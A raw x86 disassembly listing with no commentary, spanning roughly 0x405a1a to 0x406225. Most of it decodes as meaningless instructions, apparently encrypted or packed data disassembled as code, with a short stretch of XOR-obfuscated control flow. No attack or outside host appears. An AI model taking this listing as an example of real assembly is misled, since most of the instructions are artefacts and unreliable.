  405a1a:	bound  esp,QWORD PTR [eax-0x38a7560e]
  405a20:	mov    bh,0x10
  405a22:	clc    
  405a23:	cmc    
  405a24:	ret    
  405a25:	fbld   TBYTE PTR [ebx]
  405a27:	mov    cl,0xcf
  405a29:	pop    es
  405a2a:	add    BYTE PTR ds:0xb4324270,cl
  405a30:	test   al,bl
  405a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a33:	jb     0x405a75
  405a35:	cmp    edx,DWORD PTR [edx+0x4f]
  405a38:	push   ss
  405a39:	cdq    
  405a3a:	(bad)  
  405a3c:	imul   edx,DWORD PTR [ecx+eax*1+0x33],0xaef1df4f
  405a44:	jno    0x405a92
  405a46:	cmp    BYTE PTR [eax+0x3f],dl
  405a49:	jnp    0x405a3c
  405a4b:	cmp    BYTE PTR [ecx-0x12],bl
  405a4e:	mov    ds:0x295978a3,eax
  405a53:	leave  
  405a54:	pop    ds
  405a55:	lock adc eax,0x1ccde03
  405a5b:	fwait
  405a5c:	popa   
  405a5d:	pop    ebp
  405a5e:	test   eax,0x3a5af43f
  405a63:	xchg   edx,eax
  405a64:	xlat   BYTE PTR ds:[ebx]
  405a65:	pop    ecx
  405a66:	mov    ecx,DWORD PTR [edx-0x58]
  405a69:	leave  
  405a6a:	dec    ebp
  405a6b:	add    eax,0x9a0643fa
  405a70:	bound  ecx,QWORD PTR [ebx]
  405a72:	jnp    0x405a63
  405a74:	dec    edx
  405a75:	nop
  405a76:	mov    cl,cl
  405a78:	xor    cl,BYTE PTR [edi+0x6df4bf5b]
  405a7e:	or     esp,0xffffffbe
  405a81:	fcomp  DWORD PTR [edx+0x2d04d2f2]
  405a87:	jmp    0x8e88:0x35881d64
  405a8e:	push   ebp
  405a8f:	jno    0x405a15
  405a91:	pop    ss
  405a92:	icebp  
  405a93:	lahf   
  405a94:	sbb    DWORD PTR es:[edx],ebx
  405a97:	out    dx,eax
  405a98:	and    dh,0x5a
  405a9b:	fild   DWORD PTR [ebx+0x43]
  405a9e:	js     0x405a6d
  405aa0:	push   esp
  405aa1:	fidivr WORD PTR [eax+0x21]
  405aa4:	xor    eax,0x15957a74
  405aa9:	pop    esi
  405aaa:	lods   al,BYTE PTR ds:[esi]
  405aab:	inc    edx
  405aac:	mov    ds:0xf369a5dd,eax
  405ab1:	scas   al,BYTE PTR es:[edi]
  405ab2:	push   ebx
  405ab3:	or     al,BYTE PTR [ecx]
  405ab5:	popf   
  405ab6:	dec    ebx
  405ab7:	loopne 0x405b1d
  405ab9:	(bad)
  405abc:	loope  0x405abc
  405abe:	ins    BYTE PTR es:[edi],dx
  405abf:	lea    edi,[bp+di+0x1f]
  405ac3:	mov    esp,0x39fc497c
  405ac8:	(bad)  
  405ac9:	out    dx,eax
  405aca:	sub    al,0x46
  405acc:	cmp    DWORD PTR [ecx-0x11],esp
  405acf:	adc    BYTE PTR [eax+0x2bd71c08],0x27
  405ad6:	icebp  
  405ad7:	adc    esi,esi
  405ad9:	add    DWORD PTR [eax*8+0x36dd3d7a],ebp
  405ae0:	add    al,0xde
  405ae2:	and    DWORD PTR [ecx-0x76fa061d],ebp
  405ae8:	mov    al,ds:0xabb98f01
  405aed:	fs lea ebx,gs:[edi]
  405af1:	inc    edi
  405af2:	(bad)  
  405af3:	sbb    bl,cl
  405af5:	addr16 pop ecx
  405af7:	loope  0x405a99
  405af9:	out    dx,al
  405afa:	push   ecx
  405afb:	fwait
  405afc:	add    BYTE PTR [edx],ah
  405afe:	popf   
  405aff:	xor    esp,edx
  405b01:	scas   eax,DWORD PTR es:[edi]
  405b02:	xlat   BYTE PTR ds:[ebx]
  405b03:	jno    0x405b45
  405b05:	rep outs dx,BYTE PTR ds:[esi]
  405b07:	mov    ch,0x20
  405b09:	loope  0x405b62
  405b0b:	pop    esi
  405b0c:	je     0x405b68
  405b0e:	xchg   esp,eax
  405b0f:	and    al,0x5e
  405b11:	ds rcr ah,0x66
  405b15:	jnp    0x405b37
  405b17:	jns    0x405b86
  405b19:	xchg   ebx,eax
  405b1a:	sbb    al,bl
  405b1c:	xchg   esp,eax
  405b1d:	(bad)  
  405b1e:	jnp    0x405ace
  405b20:	ss in  al,dx
  405b22:	icebp  
  405b23:	cmp    BYTE PTR [edx+0x37],ch
  405b26:	xchg   ebx,eax
  405b27:	push   cs
  405b28:	jecxz  0x405b44
  405b2a:	cld    
  405b2b:	ins    BYTE PTR es:[edi],dx
  405b2c:	pop    esi
  405b2d:	js     0x405bad
  405b2f:	cs push ebp
  405b31:	push   edx
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x72df3ce0
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c47
  405be0:	mov    ebx,0x8c285969
  405be5:	popa   
  405be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be7:	out    0x2c,al
  405be9:	popf   
  405bea:	push   esp
  405beb:	lods   al,BYTE PTR ds:[esi]
  405bec:	ins    BYTE PTR es:[edi],dx
  405bed:	add    BYTE PTR [ecx+0x4dc3f816],ah
  405bf3:	std    
  405bf4:	add    bl,BYTE PTR [eax-0x1dae3040]
  405bfa:	sti    
  405bfb:	fstp   TBYTE PTR [esi-0x38]
  405bfe:	xor    DWORD PTR [eax+ecx*8],edx
  405c01:	add    al,al
  405c03:	push   DWORD PTR [ebp-0x50b7007a]
  405c09:	and    ebp,edi
  405c0b:	fstp   QWORD PTR [ecx+0x665ac307]
  405c11:	push   esp
  405c12:	(bad)  
  405c13:	(bad)  
  405c14:	rcr    DWORD PTR [esi-0x6fa0d0b2],0x9
  405c1b:	call   0xa94c75
  405c20:	xor    DWORD PTR [ebx],esi
  405c22:	cmp    BYTE PTR [eax-0x27],bl
  405c25:	jbe    0x405c2f
  405c27:	mov    ah,0x59
  405c29:	push   ds
  405c2a:	add    eax,0x78f29883
  405c2f:	retf   
  405c30:	xchg   DWORD PTR [ebx+ecx*4],esi
  405c33:	les    edx,FWORD PTR [ebx-0x39337441]
  405c39:	mov    ecx,0xb21faaf2
  405c3e:	mov    eax,cs:0x233a3f4f
  405c44:	dec    esi
  405c45:	arpl   WORD PTR [eax],sp
  405c47:	sar    edx,cl
  405c49:	add    dh,BYTE PTR ss:0x1ad7172f
  405c50:	ror    DWORD PTR [ecx],0x87
  405c53:	aas    
  405c54:	lahf   
  405c55:	ror    DWORD PTR [ecx+0x28d2afc6],cl
  405c5b:	int    0x22
  405c5d:	xor    DWORD PTR [edx],esp
  405c5f:	xor    BYTE PTR [edx],al
  405c61:	push   eax
  405c62:	lea    edi,[edx]
  405c64:	xlat   BYTE PTR ds:[ebx]
  405c65:	jns    0x405ca5
  405c67:	pop    ds
  405c68:	into   
  405c69:	cmp    al,0x5a
  405c6b:	jno    0x405c6f
  405c6d:	sub    eax,0xa48e9bee
  405c72:	sbb    esp,DWORD PTR [eax+0x71444f5a]
  405c78:	data16 fsub QWORD PTR [ebp-0x1c]
  405c7c:	loop   0x405c48
  405c7e:	test   BYTE PTR [ebp+ebx*2-0x3bed900],cl
  405c85:	and    cl,BYTE PTR [edx]
  405c87:	xchg   edx,eax
  405c88:	add    BYTE PTR [edi],al
  405c8a:	mov    dl,0x8a
  405c8c:	retf   0xcbf8
  405c8f:	mov    al,0x80
  405c91:	ficomp WORD PTR [edi+ebx*4-0x519c8af2]
  405c98:	mov    ch,dh
  405c9a:	(bad)
  405c9e:	jp     0x405cc4
  405ca0:	dec    eax
  405ca1:	fld    TBYTE PTR [edi-0x63]
  405ca4:	ins    DWORD PTR es:[edi],dx
  405ca5:	mov    ds:0x7b3a894f,eax
  405caa:	sub    DWORD PTR [ecx+0xd7ce18c],esi
  405cb0:	out    dx,al
  405cb1:	jmp    0xb2053456
  405cb6:	mov    eax,0xa68864b0
  405cbb:	mov    ebp,0x4eaa6aab
  405cc0:	mov    eax,edx
  405cc2:	xor    BYTE PTR [ebx-0x43],ah
  405cc5:	mov    ds:0xd869ea5c,al
  405cca:	mov    ch,BYTE PTR [ecx-0x1a]
  405ccd:	add    eax,0x83a9b1c9
  405cd2:	lods   al,BYTE PTR ds:[esi]
  405cd3:	xor    ecx,DWORD PTR [edi+0x40]
  405cd6:	xchg   esp,eax
  405cd7:	mov    ah,0x7
  405cd9:	adc    eax,0x85d68ae0
  405cde:	pop    eax
  405cdf:	es sub eax,0x458cd151
  405ce5:	inc    esi
  405ce6:	stos   DWORD PTR es:[edi],eax
  405ce7:	pop    ebx
  405ce8:	in     al,dx
  405ce9:	inc    esp
  405cea:	fadd   QWORD PTR [esi-0x5803f7ab]
  405cf0:	jmp    0x7c16bef7
  405cf5:	js     0x405d0b
  405cf7:	cmp    eax,0xc77191cf
  405cfc:	inc    esi
  405cfd:	(bad)  
  405cfe:	or     eax,0xc0a83810
  405d03:	cs sub bh,ah
  405d06:	fs icebp 
  405d08:	jp     0x405c91
  405d0a:	aaa    
  405d0b:	call   DWORD PTR [ebp+0x2a6b8ed3]
  405d11:	add    BYTE PTR [ecx+0x1ad456ae],ch
  405d17:	mov    al,BYTE PTR [ecx-0x1da605a4]
  405d1d:	outs   dx,DWORD PTR ds:[esi]
  405d1e:	sar    BYTE PTR [ecx+0x7ae0f7cd],0xc5
  405d25:	(bad)  
  405d26:	and    bl,BYTE PTR [ebp+0x37]
  405d29:	iret   
  405d2a:	pop    edi
  405d2b:	(bad)  
  405d2c:	xor    BYTE PTR [eax-0x4b],ch
  405d2f:	enter  0x5141,0x2
  405d33:	stos   BYTE PTR es:[edi],al
  405d34:	lea    edx,[ebx+0x5b434840]
  405d3a:	das    
  405d3b:	inc    ecx
  405d3c:	or     ecx,DWORD PTR [ebx+0x14]
  405d3f:	sub    eax,0x26c2c84e
  405d44:	add    BYTE PTR [edi+0x16d02040],dh
  405d4a:	jl     0x405d20
  405d4c:	inc    ebx
  405d4d:	add    eax,0x4138e6b3
  405d52:	jmp    0x405d26
  405d54:	jbe    0x405d7a
  405d56:	jp     0x405d42
  405d58:	nop
  405d59:	mov    ds:0x183b5bef,eax
  405d5e:	nop
  405d5f:	in     al,dx
  405d60:	jbe    0x405d08
  405d62:	call   0x7ec01a90
  405d67:	call   0xd262:0x5a6d16b1
  405d6e:	xor    bh,BYTE PTR [edx+0x670b000e]
  405d74:	jg     0x405d98
  405d76:	ror    DWORD PTR [edi+0x4b],0x33
  405d7a:	repz or al,0x44
  405d7d:	ds icebp 
  405d7f:	xchg   ebp,eax
  405d80:	dec    ebp
  405d81:	shl    DWORD PTR [edx+0x28],0x74
  405d85:	mov    bh,0x16
  405d87:	push   ss
  405d88:	add    DWORD PTR [esi],ebx
  405d8a:	scas   eax,DWORD PTR es:[edi]
  405d8b:	int    0x44
  405d8d:	xchg   edx,eax
  405d8e:	xchg   BYTE PTR [ecx],dl
  405d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d91:	jbe    0x405d62
  405d93:	cs aad 0x9d
  405d96:	jo     0x405dfb
  405d98:	inc    esp
  405d99:	shl    DWORD PTR [ebx+edi*8-0x7],1
  405d9d:	ins    DWORD PTR es:[edi],dx
  405d9e:	data16 mov al,ds:0x42cbd627
  405da4:	push   ds
  405da5:	jnp    0x405d62
  405da7:	push   ebx
  405da8:	xor    eax,0x5f63ac21
  405dad:	adc    al,0x8d
  405daf:	fcomi  st,st(0)
  405db1:	hlt    
  405db2:	sub    cl,bh
  405db4:	cs ret 
  405db6:	aaa    
  405db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405db8:	cmp    edi,DWORD PTR [esi]
  405dba:	mov    cs,WORD PTR [esi]
  405dbc:	xor    BYTE PTR [eax+0x74],ch
  405dbf:	test   eax,0xbbffcb22
  405dc4:	test   al,0xbf
  405dc6:	loopne 0x405e45
  405dc8:	cmp    BYTE PTR [ebx-0xe],al
  405dcb:	sbb    eax,0x6044984
  405dd0:	retf   
  405dd1:	mov    cs,ebx
  405dd3:	pop    ds
  405dd4:	sbb    ecx,DWORD PTR [ecx]
  405dd6:	jo     0x405d9d
  405dd8:	pop    ecx
  405dd9:	test   esi,ebp
  405ddb:	push   es
  405ddc:	mov    dl,0xa9
  405dde:	xor    al,0xb8
  405de0:	in     al,dx
  405de1:	test   eax,0x1d7660f1
  405de6:	dec    esp
  405de7:	pushf  
  405de8:	dec    ebx
  405de9:	sub    eax,0xe97ce4f5
  405dee:	out    0x2d,eax
  405df0:	push   ebx
  405df1:	xchg   esp,eax
  405df2:	lahf   
  405df3:	das    
  405df4:	xor    DWORD PTR [ecx-0x50],0x5c
  405df8:	xchg   BYTE PTR [esi-0x3fdba929],cl
  405dfe:	xchg   DWORD PTR [ebp-0x4cc04d69],edx
  405e04:	xlat   BYTE PTR ds:[ebx]
  405e05:	add    BYTE PTR [ebp+0x6c620f5c],bh
  405e0b:	cmp    eax,0xd1667d6a
  405e10:	add    eax,0x266cf40d
  405e15:	mov    bl,0xc4
  405e17:	jb     0x405da5
  405e19:	stos   BYTE PTR es:[edi],al
  405e1a:	jo     0x405e17
  405e1c:	cmp    BYTE PTR [ecx],0x13
  405e1f:	(bad)  
  405e20:	push   ds
  405e21:	jmp    0x1a4b7049
  405e26:	test   al,0x57
  405e28:	jnp    0x405e05
  405e2a:	int3   
  405e2b:	fld    TBYTE PTR [eax+0x36]
  405e2e:	or     dl,dl
  405e30:	cmp    al,0xdd
  405e32:	sbb    al,0x39
  405e34:	xor    eax,0x72be1f80
  405e39:	mov    fs,esp
  405e3b:	stos   BYTE PTR es:[edi],al
  405e3c:	sub    al,0x4e
  405e3e:	sbb    dh,dh
  405e40:	jb     0x405e81
  405e42:	pop    ebx
  405e43:	les    ebx,FWORD PTR [esi-0x40]
  405e46:	and    BYTE PTR [esi-0x27],0xb6
  405e4a:	pusha  
  405e4b:	mov    edx,0x8aa4709a
  405e50:	std    
  405e51:	or     DWORD PTR [ebx-0x1777dca8],edx
  405e57:	lods   eax,DWORD PTR ds:[esi]
  405e58:	jne    0x405e62
  405e5a:	mov    ecx,0x971848a7
  405e5f:	jg     0x405de2
  405e61:	retf   
  405e62:	jbe    0x405eb8
  405e64:	es mov ch,0x77
  405e67:	pop    ebx
  405e68:	mov    al,0x78
  405e6a:	je     0x405e68
  405e6c:	xchg   ebp,eax
  405e6d:	jae    0x405e75
  405e6f:	push   ss
  405e70:	(bad)  
  405e71:	xchg   esp,eax
  405e72:	sahf   
  405e73:	jo     0x405e34
  405e75:	cwde   
  405e76:	and    eax,ecx
  405e78:	push   ds
  405e79:	rcr    BYTE PTR [edx+0x4839af5],cl
  405e7f:	(bad)  
  405e80:	jecxz  0x405e6c
  405e82:	aas    
  405e83:	xchg   edx,eax
  405e84:	(bad)  
  405e85:	repz lea ebp,[eax-0x17]
  405e89:	pushf  
  405e8a:	div    ah
  405e8c:	psubw  mm2,QWORD PTR [edi+ebx*2+0x3b40e39]
  405e94:	mov    eax,ds:0x774106d4
  405e99:	inc    edi
  405e9a:	push   ds
  405e9b:	push   ebp
  405e9c:	xor    al,0x6a
  405e9e:	mov    esp,DWORD PTR ds:0x894d8db8
  405ea4:	lods   al,BYTE PTR ds:[esi]
  405ea5:	fcmovne st,st(1)
  405ea7:	popf   
  405ea8:	lds    edi,FWORD PTR [edx]
  405eaa:	ror    DWORD PTR [esi],cl
  405eac:	pop    esi
  405ead:	sbb    DWORD PTR [esi-0x1877e8ec],edi
  405eb3:	push   esp
  405eb4:	into   
  405eb5:	sar    esp,0xee
  405eb8:	(bad)  [esi-0x13f26bbd]
  405ebe:	pushf  
  405ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ec0:	fsub   QWORD PTR [edi-0x63]
  405ec3:	inc    esp
  405ec4:	loopne 0x405f36
  405ec6:	mov    ebp,0x9e48d2fc
  405ecb:	stos   BYTE PTR es:[edi],al
  405ecc:	and    al,BYTE PTR [edx+0x14]
  405ecf:	icebp  
  405ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ed1:	push   ecx
  405ed2:	int    0x74
  405ed4:	push   edi
  405ed5:	ja     0x405f32
  405ed7:	and    ebp,DWORD PTR [esi]
  405ed9:	imul   edx,DWORD PTR [ebx],0x6b
  405edc:	dec    ebx
  405edd:	sbb    al,0x95
  405edf:	cmp    eax,0x826a623c
  405ee4:	mov    ch,0x4f
  405ee6:	ret    0x4c7b
  405ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eea:	test   BYTE PTR ds:0x47f1dde7,ch
  405ef0:	nop
  405ef1:	cmp    BYTE PTR [ebp+edx*8-0x15],ch
  405ef5:	aam    0xb3
  405ef7:	sub    edx,ebx
  405ef9:	inc    ecx
  405efa:	push   esi
  405efb:	dec    eax
  405efc:	adc    eax,0x501074f6
  405f01:	idiv   BYTE PTR [ecx+ebp*4]
  405f04:	push   esi
  405f05:	test   eax,0x6d107c48
  405f0a:	std    
  405f0b:	gs call 0xf133:0x4bb4558e
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [eax],es
  405f27:	lds    ebx,FWORD PTR [eiz*1+0x7e7e30a6]
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	fwait
  405f33:	int    0xf
  405f35:	jecxz  0x405ef5
  405f37:	imul   eax,DWORD PTR [eax],0xffffffa8
  405f3a:	pop    esi
  405f3b:	scas   al,BYTE PTR es:[edi]
  405f3c:	push   cs
  405f3d:	mov    ebp,0xa5ba5982
  405f42:	mov    al,ds:0x7d1e72b0
  405f47:	xchg   ebx,eax
  405f48:	leave  
  405f49:	pop    esi
  405f4b:	xor    al,0x3b
  405f4d:	pop    ds
  405f4e:	das    
  405f4f:	mov    ds:0x41024bc6,al
  405f54:	test   BYTE PTR [esi+0x6d],ch
  405f57:	lea    edx,[esi]
  405f59:	fsubr  QWORD PTR [edi+0x28560470]
  405f5f:	dec    DWORD PTR [ecx-0x252781d6]
  405f65:	dec    ebx
  405f66:	xor    DWORD PTR [ebp+0x20],ebx
  405f69:	sub    DWORD PTR [ebx-0x69],edi
  405f6c:	dec    edi
  405f6d:	pop    ss
  405f6e:	mov    DWORD PTR [edi-0x7c],ebp
  405f71:	or     al,BYTE PTR [esp+esi*8+0x2bbc11d7]
  405f78:	inc    edx
  405f79:	pushf  
  405f7a:	cli    
  405f7b:	int3   
  405f7c:	(bad)  
  405f7d:	addr16 cli 
  405f7f:	out    0x3f,eax
  405f81:	rcl    BYTE PTR [edx+0x2],cl
  405f84:	mov    edi,0x488f16f6
  405f89:	mov    ebp,0x221faf5a
  405f8e:	ror    DWORD PTR [esi],0x9e
  405f91:	jge    0x405f6a
  405f93:	test   al,0x30
  405f95:	and    dh,BYTE PTR [ebx-0x6e]
  405f98:	add    bh,dl
  405f9a:	jnp    0x405fd4
  405f9c:	popa   
  405f9d:	(bad)  
  405fa0:	aas    
  405fa1:	sti    
  405fa2:	xchg   esi,eax
  405fa3:	mov    dh,al
  405fa5:	fsubr  st(6),st
  405fa7:	mov    DWORD PTR [ecx],eax
  405fa9:	or     bh,BYTE PTR [esi+0x46]
  405fac:	daa    
  405fad:	jmp    0x3b54:0x13fdea
  405fb4:	sub    al,0x67
  405fb6:	push   eax
  405fb7:	pop    edi
  405fb8:	adc    cl,BYTE PTR [edi+eiz*2]
  405fbb:	clc    
  405fbc:	jmp    0x6e25:0x54134385
  405fc3:	in     eax,0x84
  405fc5:	ror    BYTE PTR [edi-0x13ccdac8],cl
  405fcb:	inc    ebp
  405fcc:	out    0x52,al
  405fce:	fwait
  405fcf:	pop    es
  405fd0:	rcr    ecx,cl
  405fd2:	xchg   ebp,eax
  405fd3:	repz repnz (bad) 
  405fd6:	aas    
  405fd7:	out    0xab,eax
  405fd9:	repnz push edi
  405fdb:	mov    ebp,0x6c3d8296
  405fe0:	dec    esp
  405fe1:	pop    ebp
  405fe2:	add    cl,BYTE PTR [ecx-0x5e]
  405fe5:	inc    ebp
  405fe6:	mov    esi,0xfdb77709
  405feb:	push   ds
  405fec:	inc    ecx
  405fed:	hlt    
  405fee:	dec    ebp
  405fef:	sbb    al,0x9
  405ff1:	pop    esp
  405ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ff3:	add    eax,0xe5a48f20
  405ff8:	adc    ah,BYTE PTR [edi+eiz*8-0x2af12233]
  405fff:	ds lahf 
  406001:	sub    cl,cl
  406003:	pop    ebx
  406004:	inc    ebp
  406005:	adc    ch,bl
  406007:	mov    ch,0xd3
  406009:	xchg   esp,eax
  40600a:	sub    eax,0xb564ab73
  40600f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406010:	mov    edx,ebp
  406012:	pop    es
  406013:	into   
  406014:	adc    edi,DWORD PTR [eax+0x71]
  406017:	xlat   BYTE PTR ds:[ebx]
  406018:	mov    cs,WORD PTR ds:0xdd08030a
  40601e:	imul   edi,DWORD PTR [edx-0x36],0x53f12855
  406025:	cs ins DWORD PTR es:[edi],dx
  406027:	(bad)  
  406028:	sbb    ebx,DWORD PTR [eax-0x3ad54618]
  40602e:	mov    ebp,0x6b120e38
  406033:	dec    edx
  406034:	sar    BYTE PTR [esi+edx*2+0x4a],cl
  406038:	pop    eax
  406039:	mov    ecx,0x997cc44d
  40603e:	enter  0x1f11,0xc3
  406042:	outs   dx,DWORD PTR ds:[esi]
  406043:	mov    DWORD PTR [ebp+0x2b],ebx
  406046:	fst    DWORD PTR [ebp+0x1a]
  406049:	sbb    bh,BYTE PTR [esi+0x40f8d646]
  40604f:	mov    cs,WORD PTR [ebp+0x59]
  406052:	pop    edx
  406053:	push   ds
  406054:	repz xor al,0x2e
  406057:	xor    al,0xa7
  406059:	neg    DWORD PTR [edi+0x5360d09d]
  40605f:	xor    DWORD PTR [edi+0x14415c27],ecx
  406065:	repz in eax,dx
  406067:	out    dx,eax
  406068:	mov    bl,0x5d
  40606a:	(bad)  
  40606b:	mov    ebx,0x37c8ef3f
  406070:	fwait
  406071:	das    
  406072:	inc    DWORD PTR [edx+esi*2-0x4d]
  406076:	mov    eax,0xd829bc48
  40607b:	lds    esi,FWORD PTR [ecx+0x60]
  40607e:	cli    
  40607f:	push   esi
  406080:	es cmp eax,0x232f6405
  406086:	jae    0x406036
  406088:	adc    ecx,DWORD PTR [esi+0x1c]
  40608b:	lods   al,BYTE PTR ds:[esi]
  40608c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40608d:	pop    edi
  40608e:	sti    
  40608f:	je     0x406091
  406091:	push   0xffffff8c
  406093:	sti    
  406094:	xor    edx,DWORD PTR [ecx-0x3746fee]
  40609a:	mov    ds:0x3d9e2b62,eax
  40609f:	scas   eax,DWORD PTR es:[edi]
  4060a0:	xchg   al,dh
  4060a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060a3:	in     al,0x60
  4060a5:	jae    0x406117
  4060a7:	pop    ss
  4060a8:	sbb    eax,0xa172cae5
  4060ad:	mov    eax,0xaffba846
  4060b2:	mov    eax,ds:0x9c141287
  4060b7:	xor    eax,0x81bf1675
  4060bc:	mov    edi,esp
  4060be:	xchg   BYTE PTR [ebp-0x752b164a],cl
  4060c4:	or     eax,0x4b1212e2
  4060c9:	lods   al,BYTE PTR ds:[esi]
  4060ca:	pop    es
  4060cb:	pop    ds
  4060cc:	frstor [edi+0x3f]
  4060cf:	xor    DWORD PTR ds:0xbb898647,0xbb0db963
  4060d9:	cli    
  4060da:	and    al,0xba
  4060dc:	sub    dl,BYTE PTR [ecx+0x66]
  4060df:	sbb    al,0x91
  4060e1:	lock add eax,0xd73e613e
  4060e7:	ud0    ebx,ecx
  4060ea:	xchg   ebp,eax
  4060eb:	test   eax,0xc1f25502
  4060f0:	sahf   
  4060f1:	xlat   BYTE PTR ds:[ebx]
  4060f2:	in     al,dx
  4060f3:	fmul   DWORD PTR [esi-0x3c218af0]
  4060f9:	inc    ebp
  4060fa:	test   BYTE PTR [ecx+0x39ecf184],dh
  406100:	ret    0xe5c3
  406103:	std    
  406104:	xchg   ebp,eax
  406105:	addr16 jnp 0x40617a
  406108:	stc    
  406109:	repz xor ah,BYTE PTR [edx+0x5522e53b]
  406110:	jecxz  0x406139
  406112:	xor    edi,DWORD PTR [edi-0x64db85e1]
  406118:	fstp   DWORD PTR [esi+0x293cbac6]
  40611e:	push   eax
  40611f:	xchg   ecx,eax
  406120:	icebp  
  406121:	jecxz  0x40613e
  406123:	mov    BYTE PTR [edi+0x4],al
  406126:	xor    BYTE PTR [edx],ch
  406128:	rcl    ch,0x7
  40612b:	je     0x4060e2
  40612d:	pop    ecx
  40612e:	adc    BYTE PTR [ecx-0x36],cl
  406131:	nop
  406132:	cmp    al,0x10
  406134:	mov    ah,0x6e
  406136:	cdq    
  406137:	rcr    ah,1
  406139:	pusha  
  40613a:	lock adc eax,0x3d90e56f
  406140:	inc    eax
  406141:	popf   
  406142:	cmp    eax,0xc5b75b96
  406147:	sbb    BYTE PTR [ebx-0xc],al
  40614a:	fs push 0xdde706da
  406150:	inc    ebx
  406151:	jg     0x4061d2
  406153:	pop    ebx
  406154:	fs sub al,0xd3
  406157:	stc    
  406158:	hlt    
  406159:	fyl2x  
  40615b:	sub    cl,BYTE PTR [esi]
  40615d:	xor    eax,0xb10f51b0
  406162:	inc    ebp
  406163:	xchg   DWORD PTR [ebx],esi
  406165:	in     al,dx
  406166:	pop    edi
  406167:	hlt    
  406168:	pop    ds
  406169:	add    eax,0xee2aa26f
  40616e:	jmp    0xba74:0x1e6273d6
  406175:	dec    edx
  406176:	add    edx,0xffffff8b
  406179:	jge    0x406169
  40617b:	nop
  40617c:	outs   dx,BYTE PTR ds:[esi]
  40617d:	cli    
  40617e:	call   DWORD PTR [esi-0x353df970]
  406184:	lea    ebx,[edi+0x74d343f7]
  40618a:	mov    ebp,0x8e715ff2
  40618f:	inc    ebx
  406190:	lahf   
  406191:	pop    es
  406192:	push   ss
  406193:	cmp    ah,BYTE PTR [ecx-0x1e]
  406196:	inc    ebp
  406197:	les    esi,FWORD PTR [edi-0x2236c7c2]
  40619d:	into   
  40619e:	sub    eax,0x8b69c213
  4061a3:	xor    BYTE PTR [edx],0x99
  4061a6:	loopne 0x4061e4
  4061a8:	xchg   ebx,eax
  4061a9:	dec    esi
  4061aa:	mov    ecx,0x93b3d0d1
  4061af:	(bad)  
  4061b0:	std    
  4061b1:	jle    0x4061ef
  4061b3:	mov    edx,0x403f22d7
  4061b8:	call   0xbe0bfcd
  4061bd:	inc    edx
  4061be:	sahf   
  4061bf:	add    dl,bl
  4061c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061c2:	jl     0x40615d
  4061c4:	add    eax,0x126f9c19
  4061c9:	(bad)  
  4061cc:	pop    ebx
  4061cd:	sub    esi,DWORD PTR [eax+0x5b]
  4061d0:	jle    0x406154
  4061d2:	js     0x40620b
  4061d4:	cs ret 
  4061d6:	sub    cl,BYTE PTR [edi+0x1818fca0]
  4061dc:	push   ebp
  4061dd:	jmp    0x45c9fb5b
  4061e2:	hlt    
  4061e3:	cmp    bl,BYTE PTR [ebx-0xb5495f1]
  4061e9:	xchg   ebp,eax
  4061ea:	push   cs
  4061eb:	mov    dh,0x5d
  4061ed:	in     eax,0x7a
  4061ef:	xor    eax,0x24016dd7
  4061f4:	xlat   BYTE PTR ds:[ebx]
  4061f5:	ja     0x406203
  4061f7:	mov    dh,0x70
  4061f9:	xchg   ebp,eax
  4061fa:	inc    ebx
  4061fb:	sbb    ebp,DWORD PTR [eax]
  4061fd:	inc    esi
  4061fe:	and    eax,DWORD PTR [bx+di]
  406201:	call   0x24e143cf
  406206:	test   al,0x5a
  406208:	es or  esp,esp
  40620b:	not    BYTE PTR [esi-0x71c26226]
  406211:	int3   
  406212:	jno    0x4061cf
  406214:	gs adc ah,bl
  406217:	xor    BYTE PTR [ecx-0x35],dl
  40621a:	xor    DWORD PTR [ecx+ebp*4+0x1b],edx
  40621e:	pslld  mm1,QWORD PTR [ebx-0xf0d6e98]
  406225:	push   esi
